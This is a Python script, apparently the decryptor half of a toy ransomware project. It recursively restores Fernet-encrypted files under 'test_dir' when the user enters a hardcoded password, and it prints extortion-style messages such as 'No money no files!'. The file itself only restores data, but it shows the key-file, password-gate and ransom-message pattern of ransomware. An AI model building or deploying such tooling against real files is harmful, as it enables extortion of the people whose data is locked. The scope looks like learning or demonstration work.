import os, sys, base64
from cryptography.fernet import Fernet

root_dir = 'test_dir'

files = []

def list_files(base_dir):
    for file in os.listdir(base_dir):
        if file == "Ransomware.py" or file == "ransom" or file == "thekey.key" or file == "Decrypt.py" or file == sys.argv[0]:
            continue
        if os.path.isdir(os.path.join(base_dir, file)):
            list_files(os.path.join(base_dir, file))
        elif os.path.isfile(os.path.join(base_dir, file)):
            files.append(os.path.join(base_dir, file))

def encode():
    user_input = input("Enter the password to decrypt your files\n")
    password_bytes= user_input.encode('ascii')
    base64_bytes = base64.b64encode(password_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

list_files(root_dir)

Secret = "ZGVjcnlwdA=="

with open("thekey.key", "rb")as thekey:
    secret = thekey.read()

if encode() == Secret:
    for file in files:
        with open (file, "rb") as thefile:
            contents = thefile.read()
        Contents_decrypted = Fernet(secret).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(Contents_decrypted)
            
    print("All your files have been decrypted, Thank you for custom.")
else:
    print("Wrong password! => No money no files!")